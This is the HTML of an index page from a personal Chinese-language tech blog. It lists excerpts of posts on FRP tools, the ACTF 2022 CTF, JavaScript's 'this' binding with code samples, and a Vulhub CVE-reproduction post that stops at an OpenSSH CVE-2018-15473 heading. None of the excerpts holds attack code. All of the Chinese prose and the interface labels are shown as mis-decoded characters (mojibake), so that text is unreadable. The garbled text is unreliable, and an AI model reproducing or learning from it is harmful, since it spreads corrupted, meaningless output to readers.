<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta property="og:type" content="website">
<meta property="og:title" content="J1an&#39;s Little World">
<meta property="og:url" content="http://jlan.darkflow.top/page/4/index.html">
<meta property="og:site_name" content="J1an&#39;s Little World">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="J1an">
<meta name="twitter:card" content="summary"><title>J1an's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/page/4/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: {"avoidBanner":false},
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"å¤åˆ¶","copySuccess":"å¤åˆ¶æˆåŠŸ","copyError":"å¤åˆ¶å¤±è´¥"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="J1an's Little World" type="application/atom+xml">
</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">é¦–é¡µ</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">å½’æ¡£</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">æ ‡ç­¾</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">å‹é“¾</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">æœç´¢</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">J1an's Little World</div><div class="header-banner-info__subtitle">æ¬¢è¿æ¥å­¦ä¹ çŸ¥è¯†</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/78e6073f.html">ä¸€äº›å°å°å·¥å…·çš„ä½¿ç”¨</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-07-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-10-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/78e6073f.html" data-flag-title="ä¸€äº›å°å°å·¥å…·çš„ä½¿ç”¨"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="FRP"   >
          <a href="#FRP" class="heading-link"><i class="fas fa-link"></i></a><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2></div><div class="post-readmore"><a class="post-readmore__link" href="/posts/78e6073f.html"><span class="post-readmore__text">é˜…è¯»å…¨æ–‡</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/1c461d7e.html">ACTF 2022</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-29</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-10-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/1c461d7e.html" data-flag-title="ACTF 2022"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><h1 id="ACTF-2022"   >
          <a href="#ACTF-2022" class="heading-link"><i class="fas fa-link"></i></a><a href="#ACTF-2022" class="headerlink" title="ACTF 2022"></a>ACTF 2022</h1>
      <p><del>å’Œå­¦é•¿ä¸€èµ·ç†¬å¤§å¤œåšä¸å‡ºæ¥é¢˜çœŸæ˜¯å¤ªçˆ½ğŸŒ¶ï¸ï¼Œä¸‹æ¬¡ç»§ç»­</del></p></div><div class="post-readmore"><a class="post-readmore__link" href="/posts/1c461d7e.html"><span class="post-readmore__text">é˜…è¯»å…¨æ–‡</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/8f3824ff.html">JavaScriptä¸Nodejs</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-27</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-11-29</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/8f3824ff.html" data-flag-title="JavaScriptä¸Nodejs"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p>ä»å¤´å¼€å§‹äº†å±äºæ˜¯</p>
<p><strong>BOM</strong></p>
<ul>
<li>æµè§ˆå™¨å¯¹è±¡æ¨¡å‹</li>
<li>javascriptå°†æµè§ˆå™¨çš„å„ä¸ªç»„æˆéƒ¨åˆ†å°è£…æˆå¯¹è±¡<ul>
<li>Windowï¼šæµè§ˆå™¨çª—å£å¯¹è±¡</li>
<li>Navigatorï¼šæµè§ˆå™¨å¯¹è±¡</li>
<li>Screenï¼šå±å¹•å¯¹è±¡</li>
<li>Historyï¼šå†å²è®°å½•å¯¹è±¡<ul>
<li>history.back()åé€€</li>
<li>history.forward()å‰è¿›</li>
</ul>
</li>
<li>Locationï¼šåœ°å€æ å¯¹è±¡<ul>
<li>location.href()è®¾ç½®æˆ–è¿”å›å®Œæ•´URL</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>DOM</strong></p>
<ul>
<li>æ–‡æ¡£å¯¹è±¡æ¨¡å‹</li>
<li>å°†æ ‡è®°è¯­è¨€çš„å„ä¸ªéƒ¨åˆ†å°è£…æˆå¯¹è±¡<ul>
<li>Documentï¼šæ•´ä¸ªæ–‡æ¡£å¯¹è±¡</li>
<li>Elementï¼šå…ƒç´ å¯¹è±¡</li>
<li>Attributeï¼šå±æ€§å¯¹è±¡</li>
<li>Textï¼šæ–‡æœ¬å¯¹è±¡</li>
<li>Commentï¼šæ³¨é‡Šå¯¹è±¡</li>
<li></li>
</ul>
</li>
</ul>

        <h2 id="Object"   >
          <a href="#Object" class="heading-link"><i class="fas fa-link"></i></a><a href="#Object" class="headerlink" title="Object"></a>Object</h2>
      
        <h3 id="é™æ€æ–¹æ³•"   >
          <a href="#é™æ€æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h3>
      <p><strong>ï¼ˆ1ï¼‰å¯¹è±¡å±æ€§æ¨¡å‹çš„ç›¸å…³æ–¹æ³•</strong></p>
<ul>
<li><code>Object.getOwnPropertyDescriptor()</code>ï¼šè·å–æŸä¸ªå±æ€§çš„æè¿°å¯¹è±¡ã€‚</li>
<li><code>Object.defineProperty()</code>ï¼šé€šè¿‡æè¿°å¯¹è±¡ï¼Œå®šä¹‰æŸä¸ªå±æ€§ã€‚</li>
<li><code>Object.defineProperties()</code>ï¼šé€šè¿‡æè¿°å¯¹è±¡ï¼Œå®šä¹‰å¤šä¸ªå±æ€§ã€‚</li>
</ul>
<p><strong>ï¼ˆ2ï¼‰æ§åˆ¶å¯¹è±¡çŠ¶æ€çš„æ–¹æ³•</strong></p>
<ul>
<li><code>Object.preventExtensions()</code>ï¼šé˜²æ­¢å¯¹è±¡æ‰©å±•ã€‚</li>
<li><code>Object.isExtensible()</code>ï¼šåˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯æ‰©å±•ã€‚</li>
<li><code>Object.seal()</code>ï¼šç¦æ­¢å¯¹è±¡é…ç½®ã€‚</li>
<li><code>Object.isSealed()</code>ï¼šåˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å¯é…ç½®ã€‚</li>
<li><code>Object.freeze()</code>ï¼šå†»ç»“ä¸€ä¸ªå¯¹è±¡ã€‚</li>
<li><code>Object.isFrozen()</code>ï¼šåˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦è¢«å†»ç»“ã€‚</li>
</ul>
<p><strong>ï¼ˆ3ï¼‰åŸå‹é“¾ç›¸å…³æ–¹æ³•</strong></p>
<ul>
<li><code>Object.create()</code>ï¼šè¯¥æ–¹æ³•å¯ä»¥æŒ‡å®šåŸå‹å¯¹è±¡å’Œå±æ€§ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚</li>
<li><code>Object.getPrototypeOf()</code>ï¼šè·å–å¯¹è±¡çš„<code>Prototype</code>å¯¹è±¡ã€‚</li>
</ul>

        <h3 id="å®ä¾‹æ–¹æ³•"   >
          <a href="#å®ä¾‹æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#å®ä¾‹æ–¹æ³•" class="headerlink" title="å®ä¾‹æ–¹æ³•"></a>å®ä¾‹æ–¹æ³•</h3>
      <p>é™¤äº†é™æ€æ–¹æ³•ï¼Œè¿˜æœ‰ä¸å°‘æ–¹æ³•å®šä¹‰åœ¨<code>Object.prototype</code>å¯¹è±¡ã€‚å®ƒä»¬ç§°ä¸ºå®ä¾‹æ–¹æ³•ï¼Œæ‰€æœ‰<code>Object</code>çš„å®ä¾‹å¯¹è±¡éƒ½ç»§æ‰¿äº†è¿™äº›æ–¹æ³•ã€‚</p>
<p><code>Object</code>å®ä¾‹å¯¹è±¡çš„æ–¹æ³•ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å…­ä¸ªã€‚</p>
<ul>
<li><code>Object.prototype.valueOf()</code>ï¼šè¿”å›å½“å‰å¯¹è±¡å¯¹åº”çš„å€¼ã€‚</li>
<li><code>Object.prototype.toString()</code>ï¼šè¿”å›å½“å‰å¯¹è±¡å¯¹åº”çš„å­—ç¬¦ä¸²å½¢å¼ã€‚</li>
<li><code>Object.prototype.toLocaleString()</code>ï¼šè¿”å›å½“å‰å¯¹è±¡å¯¹åº”çš„æœ¬åœ°å­—ç¬¦ä¸²å½¢å¼ã€‚</li>
<li><code>Object.prototype.hasOwnProperty()</code>ï¼šåˆ¤æ–­æŸä¸ªå±æ€§æ˜¯å¦ä¸ºå½“å‰å¯¹è±¡è‡ªèº«çš„å±æ€§ï¼Œè¿˜æ˜¯ç»§æ‰¿è‡ªåŸå‹å¯¹è±¡çš„å±æ€§ã€‚</li>
<li><code>Object.prototype.isPrototypeOf()</code>ï¼šåˆ¤æ–­å½“å‰å¯¹è±¡æ˜¯å¦ä¸ºå¦ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ã€‚</li>
<li><code>Object.prototype.propertyIsEnumerable()</code>ï¼šåˆ¤æ–­æŸä¸ªå±æ€§æ˜¯å¦å¯æšä¸¾ã€‚</li>
</ul>
<p>æœ¬èŠ‚ä»‹ç»å‰å››ä¸ªæ–¹æ³•ï¼Œå¦å¤–ä¸¤ä¸ªæ–¹æ³•å°†åœ¨åæ–‡ç›¸å…³ç« èŠ‚ä»‹ç»ã€‚</p>

        <h3 id="é¢å‘å¯¹è±¡"   >
          <a href="#é¢å‘å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h3>
      
        <h3 id="this"   >
          <a href="#this" class="heading-link"><i class="fas fa-link"></i></a><a href="#this" class="headerlink" title="this"></a>this</h3>
      <p>ç®€å•è¯´ï¼Œ<code>this</code>å°±æ˜¯å±æ€§æˆ–æ–¹æ³•â€œå½“å‰â€æ‰€åœ¨çš„å¯¹è±¡ã€‚åœ¨å…¨å±€ç¯å¢ƒä¸‹é»˜è®¤<code>this</code>å°±æ˜¯æ•´ä¸ª<code>window</code>å¯¹è±¡ï¼Œ</p>
<p><code>this</code>ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªä½¿ç”¨åœºåˆã€‚</p>
<p><strong>ï¼ˆ1ï¼‰å…¨å±€ç¯å¢ƒ</strong></p>
<p>å…¨å±€ç¯å¢ƒä½¿ç”¨<code>this</code>ï¼Œå®ƒæŒ‡çš„å°±æ˜¯é¡¶å±‚å¯¹è±¡<code>window</code>ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">this &#x3D;&#x3D;&#x3D; window &#x2F;&#x2F; true

function f() &#123;
  console.log(this &#x3D;&#x3D;&#x3D; window);
&#125;
f() &#x2F;&#x2F; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç è¯´æ˜ï¼Œä¸ç®¡æ˜¯ä¸æ˜¯åœ¨å‡½æ•°å†…éƒ¨ï¼Œåªè¦æ˜¯åœ¨å…¨å±€ç¯å¢ƒä¸‹è¿è¡Œï¼Œ<code>this</code>å°±æ˜¯æŒ‡é¡¶å±‚å¯¹è±¡<code>window</code>ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰æ„é€ å‡½æ•°</strong></p>
<p>æ„é€ å‡½æ•°ä¸­çš„<code>this</code>ï¼ŒæŒ‡çš„æ˜¯å®ä¾‹å¯¹è±¡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var Obj &#x3D; function (p) &#123;
  this.p &#x3D; p;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç å®šä¹‰äº†ä¸€ä¸ªæ„é€ å‡½æ•°<code>Obj</code>ã€‚ç”±äº<code>this</code>æŒ‡å‘å®ä¾‹å¯¹è±¡ï¼Œæ‰€ä»¥åœ¨æ„é€ å‡½æ•°å†…éƒ¨å®šä¹‰<code>this.p</code>ï¼Œå°±ç›¸å½“äºå®šä¹‰å®ä¾‹å¯¹è±¡æœ‰ä¸€ä¸ª<code>p</code>å±æ€§ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var o &#x3D; new Obj(&#39;Hello World!&#39;);
o.p &#x2F;&#x2F; &quot;Hello World!&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>ï¼ˆ3ï¼‰å¯¹è±¡çš„æ–¹æ³•</strong></p>
<p>å¦‚æœå¯¹è±¡çš„æ–¹æ³•é‡Œé¢åŒ…å«<code>this</code>ï¼Œ<code>this</code>çš„æŒ‡å‘å°±æ˜¯æ–¹æ³•è¿è¡Œæ—¶æ‰€åœ¨çš„å¯¹è±¡ã€‚è¯¥æ–¹æ³•èµ‹å€¼ç»™å¦ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¼šæ”¹å˜<code>this</code>çš„æŒ‡å‘ã€‚</p>
<p>ä½†æ˜¯ï¼Œè¿™æ¡è§„åˆ™å¾ˆä¸å®¹æ˜“æŠŠæ¡ã€‚è¯·çœ‹ä¸‹é¢çš„ä»£ç ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var obj &#x3D;&#123;
  foo: function () &#123;
    console.log(this);
  &#125;
&#125;;

obj.foo() &#x2F;&#x2F; obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>obj.foo</code>æ–¹æ³•æ‰§è¡Œæ—¶ï¼Œå®ƒå†…éƒ¨çš„<code>this</code>æŒ‡å‘<code>obj</code>ã€‚</p>
<p>ä½†æ˜¯ï¼Œä¸‹é¢è¿™å‡ ç§ç”¨æ³•ï¼Œéƒ½ä¼šæ”¹å˜<code>this</code>çš„æŒ‡å‘ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; æƒ…å†µä¸€
(obj.foo &#x3D; obj.foo)() &#x2F;&#x2F; window
&#x2F;&#x2F; æƒ…å†µäºŒ
(false || obj.foo)() &#x2F;&#x2F; window
&#x2F;&#x2F; æƒ…å†µä¸‰
(1, obj.foo)() &#x2F;&#x2F; window<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>obj.foo</code>å°±æ˜¯ä¸€ä¸ªå€¼ã€‚è¿™ä¸ªå€¼çœŸæ­£è°ƒç”¨çš„æ—¶å€™ï¼Œè¿è¡Œç¯å¢ƒå·²ç»ä¸æ˜¯<code>obj</code>äº†ï¼Œè€Œæ˜¯å…¨å±€ç¯å¢ƒï¼Œæ‰€ä»¥<code>this</code>ä¸å†æŒ‡å‘<code>obj</code>ã€‚</p>
<p>å¯ä»¥è¿™æ ·ç†è§£ï¼ŒJavaScript å¼•æ“å†…éƒ¨ï¼Œ<code>obj</code>å’Œ<code>obj.foo</code>å‚¨å­˜åœ¨ä¸¤ä¸ªå†…å­˜åœ°å€ï¼Œç§°ä¸ºåœ°å€ä¸€å’Œåœ°å€äºŒã€‚<code>obj.foo()</code>è¿™æ ·è°ƒç”¨æ—¶ï¼Œæ˜¯ä»åœ°å€ä¸€è°ƒç”¨åœ°å€äºŒï¼Œå› æ­¤åœ°å€äºŒçš„è¿è¡Œç¯å¢ƒæ˜¯åœ°å€ä¸€ï¼Œ<code>this</code>æŒ‡å‘<code>obj</code>ã€‚ä½†æ˜¯ï¼Œä¸Šé¢ä¸‰ç§æƒ…å†µï¼Œéƒ½æ˜¯ç›´æ¥å–å‡ºåœ°å€äºŒè¿›è¡Œè°ƒç”¨ï¼Œè¿™æ ·çš„è¯ï¼Œè¿è¡Œç¯å¢ƒå°±æ˜¯å…¨å±€ç¯å¢ƒï¼Œå› æ­¤<code>this</code>æŒ‡å‘å…¨å±€ç¯å¢ƒã€‚ä¸Šé¢ä¸‰ç§æƒ…å†µç­‰åŒäºä¸‹é¢çš„ä»£ç ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; æƒ…å†µä¸€
(obj.foo &#x3D; function () &#123;
  console.log(this);
&#125;)()
&#x2F;&#x2F; ç­‰åŒäº
(function () &#123;
  console.log(this);
&#125;)()

&#x2F;&#x2F; æƒ…å†µäºŒ
(false || function () &#123;
  console.log(this);
&#125;)()

&#x2F;&#x2F; æƒ…å†µä¸‰
(1, function () &#123;
  console.log(this);
&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœ<code>this</code>æ‰€åœ¨çš„æ–¹æ³•ä¸åœ¨å¯¹è±¡çš„ç¬¬ä¸€å±‚ï¼Œè¿™æ—¶<code>this</code>åªæ˜¯æŒ‡å‘å½“å‰ä¸€å±‚çš„å¯¹è±¡ï¼Œè€Œä¸ä¼šç»§æ‰¿æ›´ä¸Šé¢çš„å±‚ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var a &#x3D; &#123;
  p: &#39;Hello&#39;,
  b: &#123;
    m: function() &#123;
      console.log(this.p);
    &#125;
  &#125;
&#125;;

a.b.m() &#x2F;&#x2F; undefined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>a.b.m</code>æ–¹æ³•åœ¨<code>a</code>å¯¹è±¡çš„ç¬¬äºŒå±‚ï¼Œè¯¥æ–¹æ³•å†…éƒ¨çš„<code>this</code>ä¸æ˜¯æŒ‡å‘<code>a</code>ï¼Œè€Œæ˜¯æŒ‡å‘<code>a.b</code>ï¼Œå› ä¸ºå®é™…æ‰§è¡Œçš„æ˜¯ä¸‹é¢çš„ä»£ç ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var b &#x3D; &#123;
  m: function() &#123;
   console.log(this.p);
  &#125;
&#125;;

var a &#x3D; &#123;
  p: &#39;Hello&#39;,
  b: b
&#125;;

(a.b).m() &#x2F;&#x2F; ç­‰åŒäº b.m()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœè¦è¾¾åˆ°é¢„æœŸæ•ˆæœï¼Œåªæœ‰å†™æˆä¸‹é¢è¿™æ ·ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var a &#x3D; &#123;
  b: &#123;
    m: function() &#123;
      console.log(this.p);
    &#125;,
    p: &#39;Hello&#39;
  &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœè¿™æ—¶å°†åµŒå¥—å¯¹è±¡å†…éƒ¨çš„æ–¹æ³•èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œ<code>this</code>ä¾ç„¶ä¼šæŒ‡å‘å…¨å±€å¯¹è±¡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var a &#x3D; &#123;
  b: &#123;
    m: function() &#123;
      console.log(this.p);
    &#125;,
    p: &#39;Hello&#39;
  &#125;
&#125;;

var hello &#x3D; a.b.m;
hello() &#x2F;&#x2F; undefined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>m</code>æ˜¯å¤šå±‚å¯¹è±¡å†…éƒ¨çš„ä¸€ä¸ªæ–¹æ³•ã€‚ä¸ºæ±‚ç®€ä¾¿ï¼Œå°†å…¶èµ‹å€¼ç»™<code>hello</code>å˜é‡ï¼Œç»“æœè°ƒç”¨æ—¶ï¼Œ<code>this</code>æŒ‡å‘äº†é¡¶å±‚å¯¹è±¡ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åªå°†<code>m</code>æ‰€åœ¨çš„å¯¹è±¡èµ‹å€¼ç»™<code>hello</code>ï¼Œè¿™æ ·è°ƒç”¨æ—¶ï¼Œ<code>this</code>çš„æŒ‡å‘å°±ä¸ä¼šå˜ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var hello &#x3D; a.b;
hello.m() &#x2F;&#x2F; Hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


        <h3 id="ç»‘å®š-this-çš„æ–¹æ³•"   >
          <a href="#ç»‘å®š-this-çš„æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç»‘å®š-this-çš„æ–¹æ³•" class="headerlink" title="ç»‘å®š this çš„æ–¹æ³•"></a>ç»‘å®š this çš„æ–¹æ³•</h3>
      <ol>
<li><p><code>Function.prototype.call(obj,arg1,arg2,.....)</code></p>
<p>å¯¹äºä¸€ä¸ªå‡½æ•°æ¥è¯´ï¼Œcallæ–¹æ³•å°±æ˜¯åœ¨objä¸ºthisçš„æƒ…å†µä¸‹æ‰§è¡Œå‡½æ•°ï¼Œå¦‚æœä¸ä¼ å…¥å‚æ•°é‚£ä¹ˆå°±ä¼šç›´æ¥åœ¨å…¨å±€æƒ…å†µä¸‹æ‰§è¡Œï¼Œobjä¸ºnullæˆ–undefinedä¹Ÿæ˜¯ä»¥å…¨å±€ç¯å¢ƒæ‰§è¡Œ</p>
</li>
<li><p><code>Function.prototype.apply(thisValue, [arg1, arg2, ...])</code> </p>
<p>å’Œcallçš„å”¯ä¸€åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯ä¸€ä¸ªä¸€ä¸ªä¼ å…¥ï¼Œä¸€ä¸ªæ˜¯ä¼ å‚æ•°æ•°ç»„</p>
</li>
<li><p><code>Function.prototype.bind(obj)</code></p>
<p>ä»¥ä¼ å…¥çš„å¯¹è±¡ä¸ºthisï¼Œè¿”å›é‡æ–°ç»‘å®šçš„å‡½æ•°</p>
</li>
</ol>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/67caa546.html">CVE</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-01</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/67caa546.html" data-flag-title="CVE"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="CVE"   >
          <a href="#CVE" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1>
      <p>åœ¨Vulhubä¸Šé¢çš„CVEå¤ç°ï¼Œä¸€ä»½å°è®°å½•</p>

        <h2 id="OpenSSH"   >
          <a href="#OpenSSH" class="heading-link"><i class="fas fa-link"></i></a><a href="#OpenSSH" class="headerlink" title="OpenSSH"></a>OpenSSH</h2>
      
        <h3 id="CVE-2018-15473"   >
          <a href="#CVE-2018-15473" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-15473" class="headerlink" title="CVE-2018-15473"></a>CVE-2018-15473</h3>
